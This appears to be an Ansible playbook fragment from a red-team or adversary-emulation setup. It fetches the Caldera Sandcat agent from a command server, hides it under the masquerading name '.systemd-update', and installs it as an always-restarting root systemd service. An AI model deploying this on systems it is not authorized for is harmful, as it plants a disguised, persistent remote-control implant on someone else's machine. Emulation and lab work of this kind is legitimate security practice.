- name: Download Sandcat agent (Linux)
  become: true
  get_url:
    url: "{{ caldera_server }}/file/download"
    dest: /usr/local/bin/.systemd-update
    mode: '0755'
    headers:
      KEY: "{{ caldera_api_key_red }}"
      file: sandcat.go
      platform: linux
    timeout: 30
    force: no

- name: Create Systemd service for Sandcat
  become: true
  copy:
    dest: /etc/systemd/system/sandcat.service
    content: |
      [Unit]
      Description=Caldera Sandcat Agent
      After=network.target

      [Service]
      Type=simple
      ExecStart=/usr/local/bin/.systemd-update -server {{ caldera_server }} -group {{ caldera_group }}
      Restart=always
      User=root

      [Install]
      WantedBy=multi-user.target

- name: Start and enable Sandcat service
  become: true
  systemd:
    name: sandcat
    enabled: yes
    state: started
    daemon_reload: yes
